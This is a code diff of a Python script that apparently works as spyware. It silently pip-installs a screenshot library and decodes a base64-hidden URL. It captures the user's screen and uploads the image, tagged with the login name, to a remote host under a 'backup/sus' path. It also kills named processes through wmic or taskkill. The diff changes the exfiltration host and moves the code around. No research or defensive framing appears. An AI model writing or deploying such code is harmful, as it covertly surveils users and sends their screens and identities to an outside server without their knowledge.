@@ -10,22 +10,21 @@ def importinstall(pipname,modulename=None,update=False,**importkwargs):
             return __import__(modulename)
         except ImportError:
             pass
-    os.system(rf'pip install{" --upgrade" if update else ""} {pipname}', shell=True)
+    os.system(rf'pip install{" --upgrade" if update else ""} {pipname}')
     return __import__(modulename)
 
 pyscreeze = importinstall('pyscreeze')
 
 def a():
-    u = base64.b64decode(b'aHR0cHM6Ly9ib29raXNoLXN5c3RlbS1qZ3Z2N3B4ajk2d2g1d2pxLTgwODAuYXBwLmdpdGh1Yi5kZXYv').decode()
-    if pre := hasattr(request(u, method='HEAD'),"getcode"):
-        print(pre)
-        return
+    u = base64.b64decode(b'Y2F0NS5weXRob25hbnl3aGVyZS5jb20vYmFja3VwL3N1cy8=').decode()
+
     try:
+        if pre := hasattr(request(u, method='HEAD'),"getcode"):
+            print(pre)
+            return
         img = pyscreeze.screenshot()
-        print('e')
         img = img.resize((int(img.size[0]/img.size[1]*340),340))
         img.save('tmp.png')
-        print('e')
         with open('tmp.png', 'rb') as imgbytes:
             request(u+'receive/'+getpass.getuser(), imgbytes.read(), 'POST')
     except Exception as e:
@@ -75,7 +74,7 @@ usednames = []
 
 
 def f(x):
-    out = subprocess.call(rf'wmic process where name="{x}" delete', shell=True)
+    out = subprocess.call(rf'taskkill /im {x}', shell=True)
     if verbose:
         if not out:
             print("killed",x)
